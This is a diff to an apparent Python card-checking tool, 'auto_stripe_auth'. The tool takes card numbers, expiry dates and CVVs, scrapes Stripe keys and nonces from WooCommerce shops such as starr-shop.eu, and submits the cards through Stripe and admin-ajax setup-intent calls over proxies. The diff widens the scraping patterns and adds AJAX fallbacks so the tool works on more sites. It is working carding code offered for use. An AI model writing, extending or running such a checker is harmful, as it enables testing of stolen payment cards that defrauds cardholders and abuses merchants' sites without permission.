@@ -17,7 +17,7 @@ import random
 import string
 import base64
 import logging
-from typing import Dict, Optional, Tuple
+from typing import Dict, Optional
 from urllib.parse import urlparse, parse_qs
 
 import aiohttp
@@ -144,6 +144,7 @@ async def auto_stripe_auth(
         return result
     cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
     exp_year = ano[-2:] if len(ano) == 4 else ano
+    exp_month = mes.zfill(2) if len(mes) == 1 else mes
 
     url = site_url.strip().rstrip("/")
     if not url.startswith(("http://", "https://")):
@@ -240,13 +241,21 @@ async def auto_stripe_auth(
 
         await asyncio.sleep(0.3)
 
-        # 2) GET add-payment-method/
+        # 2) GET payment-methods/ then add-payment-method/ (some sites e.g. starr-shop.eu expect this order)
         pay_headers = {
             **headers_base,
-            "Referer": f"{base}/my-account/payment-methods/",
+            "Referer": f"{base}/my-account/",
             "Cache-Control": "no-cache",
             "Pragma": "no-cache",
         }
+        async with session.get(
+            f"{base}/my-account/payment-methods/",
+            headers=pay_headers,
+            proxy=proxy,
+        ) as resp:
+            if resp.status == 200:
+                await resp.text()
+        pay_headers["Referer"] = f"{base}/my-account/payment-methods/"
         async with session.get(
             f"{base}/my-account/add-payment-method/",
             headers=pay_headers,
@@ -272,22 +281,51 @@ async def auto_stripe_auth(
             ) as resp:
                 html_pay = await resp.text()
 
+        # Publishable key: JSON "publishableKey" first, then raw pk_live_/pk_test_ (e.g. starr-shop.eu)
+        pks = None
         pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html_pay)
-        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html_pay)
-        nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html_pay)
-        if not nonce_m:
-            nonce_m = re.search(r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', html_pay)
-        if not nonce_m:
-            nonce_m = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', html_pay)
-        if not nonce_m:
-            nonce_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', html_pay)
-        if not pks_m or not acct_m or not nonce_m:
+        if pks_m:
+            pks = pks_m.group(1).strip()
+        if not pks:
+            pk_raw = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html_pay)
+            if pk_raw:
+                pks = pk_raw.group(0)
+        if not pks:
             result["response"] = "STRIPE_KEYS_MISSING"
-            result["message"] = "publishableKey/accountId/createSetupIntentNonce not found"
+            result["message"] = "Stripe publishable key (publishableKey or pk_live_/pk_test_) not found"
             return result
-        pks = pks_m.group(1)
-        acct = acct_m.group(1)
-        nonce = nonce_m.group(1)
+
+        # accountId optional (WooCommerce Stripe Gateway often omits it; Connect uses it)
+        acct = None
+        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html_pay)
+        if acct_m:
+            acct = acct_m.group(1).strip()
+
+        # Nonce: multiple patterns for WC Payments vs WC Stripe Gateway (starr-shop.eu uses createAndConfirmSetupIntentNonce / _ajax_nonce)
+        nonce = None
+        nonce_patterns = [
+            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
+            r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
+            r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
+            r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
+            r'"_ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']',
+            r'name=["\']_ajax_nonce["\']\s+value=["\']([^"\']+)["\']',
+            r'value=["\']([^"\']+)["\'][^>]*name=["\']_ajax_nonce["\']',
+            r'nonce["\']?\s*:\s*["\']([^"\']+)["\']',
+        ]
+        for pat in nonce_patterns:
+            nonce_m = re.search(pat, html_pay)
+            if nonce_m:
+                nonce = nonce_m.group(1).strip()
+                break
+        if not nonce:
+            nonce_input = re.search(r'<input[^>]+name=["\']_ajax_nonce["\'][^>]+value=["\']([^"\']+)["\']', html_pay)
+            if nonce_input:
+                nonce = nonce_input.group(1).strip()
+        if not nonce:
+            result["response"] = "STRIPE_KEYS_MISSING"
+            result["message"] = "Setup intent nonce (_ajax_nonce / createSetupIntentNonce) not found"
+            return result
 
         # 3) POST api.stripe.com/v1/payment_methods
         stripe_headers = {
@@ -310,10 +348,11 @@ async def auto_stripe_auth(
             "card[number]": cc,
             "card[cvc]": cvv,
             "card[exp_year]": exp_year,
-            "card[exp_month]": mes,
+            "card[exp_month]": exp_month,
             "key": pks,
-            "_stripe_account": acct,
         }
+        if acct:
+            stripe_data["_stripe_account"] = acct
         async with session.post(
             "https://api.stripe.com/v1/payment_methods",
             headers=stripe_headers,
@@ -347,48 +386,47 @@ async def auto_stripe_auth(
             return result
         result["payment_method_id"] = pm_id
 
-        # 4) POST admin-ajax.php create_setup_intent (WooCommerce Payments) or create_and_confirm_setup_intent (WooCommerce Stripe Gateway)
-        def _ajax_submit(action_name: str, field_name: str) -> Tuple[str, aiohttp.FormData]:
-            form = aiohttp.FormData()
-            form.add_field("action", action_name)
-            form.add_field(field_name, pm_id)
-            form.add_field("_ajax_nonce", nonce)
-            return field_name, form
+        # 4) POST admin-ajax.php — try multiple actions (WC Payments vs WC Stripe Gateway e.g. starr-shop.eu)
+        def _ajax_data(action_name: str, field_name: str, extra_fields: Optional[Dict[str, str]] = None) -> Dict[str, str]:
+            data = {"action": action_name, field_name: pm_id, "_ajax_nonce": nonce}
+            if extra_fields:
+                data.update(extra_fields)
+            return data
 
         ajax_headers = {
             "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "Accept-Language": "en-US,en;q=0.9",
             "Origin": base,
             "Referer": f"{base}/my-account/add-payment-method/",
             "User-Agent": ua,
             "X-Requested-With": "XMLHttpRequest",
         }
-        # Try WooCommerce Payments first (create_setup_intent, wcpay-payment-method)
-        _, form = _ajax_submit("create_setup_intent", "wcpay-payment-method")
-        ajax_headers["Content-Type"] = form.content_type
-        async with session.post(
-            f"{base}/wp-admin/admin-ajax.php",
-            headers=ajax_headers,
-            data=form,
-            proxy=proxy,
-        ) as resp:
-            ajax_text = await resp.text()
-
-        # Fallback: WooCommerce Stripe Gateway uses create_and_confirm_setup_intent + wc-stripe-payment-method
-        try:
-            first_json = json.loads(ajax_text)
-            if not first_json.get("success"):
-                _, form2 = _ajax_submit("create_and_confirm_setup_intent", "wc-stripe-payment-method")
-                ajax_headers["Content-Type"] = form2.content_type
-                async with session.post(
-                    f"{base}/wp-admin/admin-ajax.php",
-                    headers=ajax_headers,
-                    data=form2,
-                    proxy=proxy,
-                ) as resp2:
-                    ajax_text = await resp2.text()
-        except json.JSONDecodeError:
-            pass
+        # Try in order: WC Payments, then WC Stripe Gateway (starr-shop.eu uses wc_stripe_create_and_confirm_setup_intent)
+        ajax_candidates = [
+            ("create_setup_intent", "wcpay-payment-method", None),
+            ("create_and_confirm_setup_intent", "wc-stripe-payment-method", None),
+            ("wc_stripe_create_and_confirm_setup_intent", "wc-stripe-payment-method", {"wc-stripe-payment-type": "card"}),
+        ]
+        ajax_text = ""
+        for action_name, field_name, extra in ajax_candidates:
+            data = _ajax_data(action_name, field_name, extra)
+            async with session.post(
+                f"{base}/wp-admin/admin-ajax.php",
+                headers=ajax_headers,
+                data=data,
+                proxy=proxy,
+            ) as resp:
+                ajax_text = await resp.text()
+            try:
+                parsed = json.loads(ajax_text)
+                if parsed.get("success") is True:
+                    break
+                if parsed.get("success") is False and "data" in parsed:
+                    continue
+            except json.JSONDecodeError:
+                pass
+        # Use last response for parsing below
 
         try:
             ajax_json = json.loads(ajax_text)
